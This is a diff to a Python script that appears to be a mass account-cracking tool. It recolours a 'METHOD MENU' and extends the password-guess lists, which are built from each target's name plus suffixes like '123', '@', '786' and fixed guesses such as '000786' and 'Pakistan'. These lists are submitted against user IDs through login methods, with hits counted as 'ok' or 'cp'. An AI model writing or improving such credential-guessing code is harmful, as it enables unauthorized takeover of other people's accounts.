@@ -362,9 +362,10 @@ class __chigoue__:
     def __pler__(self):
         os.system('clear')
         logo()
-        print ('[1] Method {1}')
-        print ('[2] Method {2}')
-        print ('[3] Method {3}')
+        print('%s══════════════════════════════════════════\n %sMETHOD MENU%s'%(N,BM,N))
+        print(' %s[%s1%s] Method 1 Free (%sRecommended%s)'%(N,H,N,H,N))
+        print(' [%s2%s] Method 2 Basic (%sRecommended%s)'%(H,N,H,N))
+        print(' [%s3%s] Method 3 Mobile (%sRecommended%s)'%(H,N,H,N))
         yan = input('\n%s[%s+%s] Select Method : '%(H,H,H))
         if yan == '':
             print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.__pler__()
@@ -398,9 +399,9 @@ class __chigoue__:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                           pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"@@", xz[0]+"@"]
+                           pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"@@", xz[0]+"@", xz[0]+"786", "000786", "Pakistan"]
                        else:
-                           pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"@", xz[0]+"@@"]
+                           pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"@", xz[0]+"@@", xz[0]+"786", "000786", "pakistan"]
                        kirim.submit(self.__metode__,url,uid,pwx)
                    except:pass
             hasil(ok,cp)
